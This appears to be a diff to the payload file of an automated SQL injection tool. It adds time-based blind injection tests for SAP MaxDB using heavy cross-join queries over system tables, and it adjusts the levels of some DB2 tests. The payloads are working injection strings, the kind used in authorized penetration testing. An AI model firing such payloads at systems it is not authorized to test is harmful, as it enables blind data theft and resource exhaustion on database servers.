@@ -2197,9 +2197,48 @@ Formats:
     </test>
 
     <test>
+        <title>SAP MaxDB AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1, (SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2, (SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1, DOMAIN.COLUMNS AS T2, DOMAIN.TABLES AS T3)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SAP MaxDB AND time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1, (SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2, (SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1, DOMAIN.COLUMNS AS T2, DOMAIN.TABLES AS T3)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+
+    <test>
         <title>DB2 AND time-based blind (heavy query)</title>
         <stype>5</stype>
-        <level>2</level>
+        <level>3</level>
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
@@ -2234,7 +2273,7 @@ Formats:
             <dbms>DB2</dbms>
         </details>
     </test>
-    <!-- TODO: if possible, add payload for Microsoft Access and SAP MaxDB -->
+    <!-- TODO: if possible, add payload for Microsoft Access -->
     <!-- End of AND time-based blind tests -->
 
 
@@ -2417,9 +2456,28 @@ Formats:
     </test>
 
     <test>
+        <title>SAP MaxDB OR time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1, (SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2, (SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1, DOMAIN.COLUMNS AS T2, DOMAIN.TABLES AS T3)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+
+    <test>
         <title>DB2 OR time-based blind (heavy query)</title>
         <stype>5</stype>
-        <level>3</level>
+        <level>4</level>
         <risk>3</risk>
         <clause>1,2,3</clause>
         <where>2</where>
@@ -2434,7 +2492,7 @@ Formats:
             <dbms>DB2</dbms>
         </details>
     </test>
-    <!-- TODO: if possible, add payload for Microsoft Access and SAP MaxDB -->
+    <!-- TODO: if possible, add payload for Microsoft Access -->
     <!-- End of OR time-based blind tests -->
 
 
